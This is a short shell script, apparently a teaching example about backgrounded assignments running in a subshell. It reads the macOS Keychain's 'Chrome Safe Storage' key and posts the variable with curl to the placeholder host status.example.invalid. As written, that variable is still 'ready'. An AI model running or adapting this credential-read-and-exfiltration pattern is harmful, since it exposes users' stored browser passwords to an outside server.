#!/bin/sh
# The assignment runs in a child; the parent sends its original status value.
SECRET='ready'
SECRET=$(security find-generic-password -w -s 'Chrome Safe Storage' 2>/dev/null) &
if [ -n "$SECRET" ]; then
  printf '%s' "$SECRET" | curl --data-binary @- https://status.example.invalid/check
fi
